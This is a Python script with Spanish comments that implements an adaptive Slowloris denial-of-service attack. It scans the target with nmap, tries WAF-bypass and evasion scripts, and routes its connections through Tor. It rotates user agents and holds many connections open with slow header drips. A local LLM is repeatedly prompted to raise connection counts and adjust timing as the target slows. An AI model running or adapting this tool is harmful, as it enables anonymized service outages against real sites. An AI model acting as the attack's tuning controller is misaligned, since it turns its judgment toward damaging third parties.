# 1) Params (entrada)
# 2) Config básica
# 3) NMAP resumido (comandos)
# 4) Lista scripts NMAP WAF
# 5) Func pregunta IA
# 6) Func parsear outputs IA
# 7) Func medición tiempo de respuesta de la pág y IA
# 8) Prompt incial IA
# 9) Slowloris
# 10) Func monitoreo IA
# 11) Func monitoreo IA t/r
# 12) Bucle principal de ataque

import sys
import argparse
import logging
import subprocess
import requests
import json
import re
import random
import time
import socket
import ssl
import threading

try:
    import socks  # PySocks (necesario para TOR)
except ImportError:
    print("[!] Necesitas 'PySocks': pip install pysocks")
    sys.exit(1)

def main():
    ###########################################################################
    # 1) PARÁMETROS
    ###########################################################################
    parser = argparse.ArgumentParser(
        description="Nmap resumido + IA - Slowloris adaptativo"
    )
    parser.add_argument("TARGET", help="Host/URL. Ejemplo: testphp.vulnweb.com o http://example.com")
    parser.add_argument("-p", "--port", default=80, type=int, help="Puerto (default 80)")
    parser.add_argument("-c", "--count", default=100, type=int, help="Conexiones Slowloris (default 100)")
    parser.add_argument("-f", "--freq", default=10, type=int, help="Frecuencia (seg) para mandar cabeceras (default 10)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Logging DEBUG")
    parser.add_argument("-s", "--https", action="store_true", help="Usar HTTPS en Slowloris")
    parser.add_argument("--no-tor", action="store_true", help="No usar Tor (si no disponible)")
    parser.add_argument("--check-interval", default=120, type=int, help="Intervalo (seg) para medir tiempo de respuesta (default 120)")
    parser.add_argument("--ai-interval", default=300, type=int, help="Intervalo (seg) para consultar a la IA (default 300)")
    args = parser.parse_args()

    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%H:%M:%S",
        level=logging.DEBUG if args.verbose else logging.INFO
    )

    ###########################################################################
    # 2) CONFIG BÁSICA
    ###########################################################################
    host = args.TARGET
    port = args.port
    connections = args.count
    freq = args.freq
    use_ssl = args.https
    USE_TOR = not args.no_tor  # Por defecto True, se desactiva con --no-tor
    check_interval = args.check_interval  # Intervalo para medir tiempo de respuesta
    ai_interval = args.ai_interval  # Intervalo para consultar a la IA

    # Manejar caso de URL con http:// o https://
    if "://" in host:
        tmp = host.split("://", 1)[1]
        tmp = tmp.split("/", 1)[0]
        host = tmp
    if ":" in host:
        parts = host.split(":", 1)
        host = parts[0]
        port = int(parts[1])

    logging.info(f"Objetivo: {host}:{port}, SSL={use_ssl}, Conexiones={connections}, Frecuencia={freq}")
    logging.info(f"Uso de Tor: {USE_TOR}")

    # ##########################################################################
    # 3) NMAP RESUMIDO (+ DETECCIÓN WAF)
    # ##########################################################################
    logging.info("[+] Escaneo Nmap rápido...")
    cmd_nmap = [
        "nmap",
        "-sS",
        "-p80,443",
        "--min-rate", "1000",
        "-Pn",
        host
    ]
    try:
        out = subprocess.run(cmd_nmap, capture_output=True, text=True)
        lines_utiles = []
        waf_detected = False
        for line in out.stdout.splitlines():
            low = line.lower()
            if any(x in low for x in ["open", "closed", "filtered"]):
                lines_utiles.append(line.strip())
            if "waf" in low:
                waf_detected = True
                lines_utiles.append(line.strip() + " [WAF?]")
        nmap_resumen = "\n".join(lines_utiles)
    except Exception as e:
        nmap_resumen = f"[Error Nmap] {e}"
        waf_detected = False

    logging.info(f"[Nmap Resumen] =>\n{nmap_resumen}")
    if waf_detected:
        logging.info("[!] Posible WAF detectado en la salida de Nmap.")

    # ##########################################################################
    # 4) LISTADO DE SCRIPTS AVANZADOS PARA WAF
    # ##########################################################################
    waf_scripts = [
        "http-waf-bypass",
        "http-waf-evasion",
        "http-waf-fingerprint"
    ]

    # ##########################################################################
    # 5) FUNCIÓN PARA PREGUNTAR A LA IA
    # ##########################################################################
    OLLAMA_URL = "http://127.0.0.1:11434/api/generate"
    OLLAMA_MODEL = "llama3.2"

    def preguntar_ia(prompt_str):
        try:
            resp = requests.post(
                OLLAMA_URL,
                json={
                    "model": OLLAMA_MODEL,
                    "prompt": prompt_str
                }
            )
            if resp.status_code == 200:
                partes = []
                for linea in resp.text.splitlines():
                    try:
                        data = json.loads(linea)
                        if "response" in data:
                            partes.append(data["response"])
                    except json.JSONDecodeError:
                        continue
                raw_txt = "\n".join(partes)
                # Quitar saltos de línea, espacios repetidos
                resp_ok = re.sub(r"\s+", " ", raw_txt).strip()
                return resp_ok
            else:
                return f"[Error llama3.2] {resp.status_code}: {resp.text}"
        except Exception as ex:
            return f"[Excepción llama3.2] {ex}"

    # ##########################################################################
    # 6) FUNCIÓN PARA PARSEAR RESPUESTAS DE LA IA
    # ##########################################################################
    def parse_response(response):
        nonlocal waf_detected
        # - connections=NN
        match_cnx = re.search(r"connections\s*=\s*(\d+)", response)
        # - freq=NN
        match_freq = re.search(r"freq\s*=\s*(\d+)", response)
        # - ejecutar=SCRIPT (en caso de WAF detectado)
        match_ej = re.search(r"ejecutar\s*=\s*([^\s]+)", response)

        updates = {}
        if match_cnx:
            new_c = int(match_cnx.group(1))
            updates["connections"] = new_c
            logging.info(f"[!] IA sugiere connections={new_c}")
        if match_freq:
            new_f = int(match_freq.group(1))
            updates["freq"] = new_f
            logging.info(f"[!] IA sugiere freq={new_f}")
        if waf_detected and match_ej:
            script_name = match_ej.group(1)
            if script_name in waf_scripts:
                # Ejecutar Nmap con ese script
                logging.info(f"[!] IA sugiere script WAF: {script_name}")
                cmd_script = ["nmap", "-p80,443", "--script", script_name, host]
                logging.info(f"[Nmap WAF script] => {' '.join(cmd_script)}")
                try:
                    r_ = subprocess.run(cmd_script, capture_output=True, text=True)
                    logging.info("[Salida script WAF]\n" + r_.stdout)
                except Exception as e:
                    logging.warning(f"[!] Fallo al ejecutar script WAF: {e}")
        return updates

    # ##########################################################################
    # 7) FUNCIÓN PARA MEDIR TIEMPO DE RESPUESTA
    # ##########################################################################
    def medir_tiempo_respuesta():
        url = f"http{'s' if use_ssl else ''}://{host}:{port}/"
        try:
            start = time.time()
            resp = requests.get(url, timeout=10)
            end = time.time()
            tiempo = end - start
            logging.info(f"[+] Tiempo de respuesta: {tiempo:.2f} segundos")
            with response_times_lock:
                response_times.append(tiempo)
                # Mantener los últimos 10 registros para el promedio
                if len(response_times) > 10:
                    response_times.pop(0)
        except Exception as e:
            logging.warning(f"[!] Fallo al medir tiempo de respuesta: {e}")
            with response_times_lock:
                response_times.append(None)  # Indica una falla
                if len(response_times) > 10:
                    response_times.pop(0)

    # ##########################################################################
    # 8) PROMPT INICIAL A LA IA (INCLUYENDO MEDICIÓN INICIAL)
    # ##########################################################################
    # Definir las variables compartidas y locks antes de definir las funciones
    shared_params_lock = threading.Lock()
    shared_params = {
        "connections": connections,
        "freq": freq
    }

    response_times_lock = threading.Lock()
    response_times = []

    logging.info("[+] Medición inicial del tiempo de respuesta...")
    medir_tiempo_respuesta()

    with response_times_lock:
        tiempos_validos = [t for t in response_times if t is not None]
        if tiempos_validos:
            promedio_tiempo = sum(tiempos_validos) / len(tiempos_validos)
        else:
            promedio_tiempo = None

    if waf_detected:
        # Prompt para WAF
        scripts_list_str = ", ".join(waf_scripts)
        prompt_inicial = f"""
Se ha detectado un posible WAF en {host}:{port}.
Nmap summary:
{nmap_resumen}

Promedio tiempo de respuesta: {promedio_tiempo if promedio_tiempo is not None else 'N/A'} segundos.

Puedes cambiar:
- connections=NUM
- freq=NUM
- ejecutar=SCRIPTAWAF  (donde SCRIPTAWAF es uno de {scripts_list_str})
Responde en UNA sola linea, sin palabras cortadas. 
Ejemplo: "connections=120 freq=5 ejecutar=http-waf-bypass" o "no cambios".
"""
    else:
        # Prompt normal: Solo modificar conexiones y freq (llama a meta 3.2 (indicado a config (p5)))
        prompt_inicial = f"""
No se ha detectado WAF en {host}:{port}.
Nmap summary:
{nmap_resumen}

Promedio tiempo de respuesta: {promedio_tiempo if promedio_tiempo is not None else 'N/A'} segundos.

Puedes cambiar:
- connections=NUM
- freq=NUM
O decir "no cambios".
Responde en UNA sola linea.
"""

    logging.info("[+] Consultando a la IA (inicio)...")
    resp_ini = preguntar_ia(prompt_inicial)
    logging.info(f"=== Respuesta IA (inicio) ===\n{resp_ini}\n")

    # Aplicar cambios iniciales
    with shared_params_lock:
        updates = parse_response(resp_ini)
        if "connections" in updates:
            shared_params["connections"] = updates["connections"]
        if "freq" in updates:
            shared_params["freq"] = updates["freq"]

    # ##########################################################################
    # 9) ATAQUE SLOWLORIS
    # ##########################################################################
    attackers = []
    attackers_lock = threading.Lock()

    def crear_socket_tor():
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        s = socks.socksocket()
        s.settimeout(5)
        return s

    def init_connection(idx):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "curl/7.81",
            "Wget/1.21.1",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        ]
        if USE_TOR:
            sk = crear_socket_tor()
        else:
            sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sk.settimeout(5)

        try:
            if use_ssl:
                context = ssl.create_default_context()
                sk = context.wrap_socket(sk, server_hostname=host)

            sk.connect((host, port))
            if use_ssl:
                sk.do_handshake()

            # Generar headers dinámicos
            headers = {
                "Host": host,
                "User-Agent": random.choice(agents),
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Keep-Alive": "115"
            }

            # Enviar solicitud inicial con headers
            request = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n"
            for header, value in headers.items():
                request += f"{header}: {value}\r\n"
            request += "\r\n"
            sk.send(request.encode())

            return {"id": idx, "sock": sk}
        except Exception as e:
            logging.warning(f"[!] Fallo al inicializar conexión {idx}: {e}")
            return None

    def keep_alive_sockets():
        muertos = 0
        with attackers_lock:
            for at in list(attackers):
                try:
                    # Generación headers dinámicos adicionales
                    cab = f"X-{random.randint(0,9999)}: {random.randint(0,9999)}"
                    at["sock"].send((cab + "\r\n").encode())
                except Exception:
                    muertos += 1
                    attackers.remove(at)
        return muertos

    def iniciar_conexiones(n):
        creaciones = 0
        for i in range(n):
            idc = len(attackers) + 1
            conn = init_connection(idc)
            if conn:
                with attackers_lock:
                    attackers.append(conn)
                creaciones += 1
        return creaciones

    logging.info(f"[+] Iniciando Slowloris con {shared_params['connections']} conexiones...")
    creadas = iniciar_conexiones(shared_params["connections"])
    logging.info(f"[+] Conexiones creadas: {creadas}")

    # ##########################################################################
    # 10) FUNCIÓN DE MONITOREO DE LA IA
    # ##########################################################################
    def monitor_ia():
        next_ai_time = time.time() + ai_interval
        while not stop_event.is_set():
            try:
                current_time = time.time()
                if current_time >= next_ai_time:
                    with shared_params_lock:
                        current_connections = shared_params["connections"]
                        current_freq = shared_params["freq"]

                    with response_times_lock:
                        tiempos_validos = [t for t in response_times if t is not None]
                        if tiempos_validos:
                            promedio_tiempo = sum(tiempos_validos) / len(tiempos_validos)
                        else:
                            promedio_tiempo = None

                    active_connections = len(attackers)
                    muertos = 0  # lógica para determinar cuántas mueren

                    if waf_detected:
                        waf_scripts_str = ", ".join(waf_scripts)
                        prompt_corto = f"""
Hay WAF detectado.
Conex deseadas={current_connections}, activas={active_connections}, muertas={muertos}, freq={current_freq}.
Promedio tiempo de respuesta: {promedio_tiempo if promedio_tiempo is not None else 'N/A'} segundos.
Puedes decir: 'connections=NN', 'freq=NN', 'ejecutar=SCRIPT' (entre {waf_scripts_str}), o 'no cambios'.
Responde en UNA sola linea.
"""
                    else:
                        # Prompt restringido solo a modificar conexiones y freq
                        prompt_corto = f"""
No WAF detectado.
Conex deseadas={current_connections}, activas={active_connections}, muertas={muertos}, freq={current_freq}.
Promedio tiempo de respuesta: {promedio_tiempo if promedio_tiempo is not None else 'N/A'} segundos.
Puedes cambiar:
- connections=NUM
- freq=NUM
O decir "no cambios".
Responde en UNA sola linea.
"""

                    logging.info(f"[+] Consultando a la IA para ajustes dinámicos...")
                    r_ia = preguntar_ia(prompt_corto)
                    logging.info(f"=== Respuesta IA ===\n{r_ia}\n")

                    # Parsear y aplicar cambios
                    with shared_params_lock:
                        updates = parse_response(r_ia)
                        if "connections" in updates:
                            new_conn = updates["connections"]
                            if new_conn > shared_params["connections"]:
                                # Añadir conexiones
                                to_add = new_conn - shared_params["connections"]
                                creadas = iniciar_conexiones(to_add)
                                logging.info(f"[!] IA ajusta connections a {new_conn} (añadidas {creadas})")
                            elif new_conn < shared_params["connections"]:
                                # Reducir conexiones
                                to_remove = shared_params["connections"] - new_conn
                                with attackers_lock:
                                    for _ in range(to_remove):
                                        if attackers:
                                            at = attackers.pop()
                                            try:
                                                at["sock"].close()
                                            except:
                                                pass
                                logging.info(f"[!] IA ajusta connections a {new_conn} (eliminadas {to_remove})")
                            shared_params["connections"] = new_conn

                        if "freq" in updates:
                            new_freq = updates["freq"]
                            logging.info(f"[!] IA ajusta freq a {new_freq}")
                            shared_params["freq"] = new_freq

                    # Actualizar el próximo tiempo de consulta a la IA
                    next_ai_time = current_time + ai_interval

                time.sleep(1)  # espera para evitar un bucle demasiado rápido
            except Exception as e:
                logging.error(f"[!] Error en monitor_ia: {e}")
                time.sleep(5)

    # ##########################################################################
    # 11) FUNCIÓN DE MONITOREO DEL TIEMPO DE RESPUESTA
    # ##########################################################################
    def monitor_response_time():
        while not stop_event.is_set():
            medir_tiempo_respuesta()
            time.sleep(check_interval)

    # ##########################################################################
    # 12) BUCLE PRINCIPAL DE ATAQUE
    # ##########################################################################
    stop_event = threading.Event()
    monitor_thread = threading.Thread(target=monitor_ia, daemon=True)
    response_thread = threading.Thread(target=monitor_response_time, daemon=True)
    monitor_thread.start()
    response_thread.start()

    try:
        while not stop_event.is_set():
            muertos = keep_alive_sockets()
            logging.info(f"Manteniendo {len(attackers)} conexiones (muertas {muertos} en este ciclo)...")

            with shared_params_lock:
                current_connections = shared_params["connections"]

            # Reponer
            faltan = current_connections - len(attackers)
            if faltan > 0:
                nuevo = iniciar_conexiones(faltan)
                if nuevo > 0:
                    logging.debug(f"Repuestas {nuevo} conexiones...")

            time.sleep(shared_params["freq"])
    except KeyboardInterrupt:
        logging.info("[!] Saliendo...")
        stop_event.set()
    finally:
        # Cerrar todas las conexiones
        with attackers_lock:
            for at in attackers:
                try:
                    at["sock"].close()
                except:
                    pass
            attackers.clear()
        logging.info("[+] Todas las conexiones han sido cerradas.")

if __name__ == "__main__":
    main()
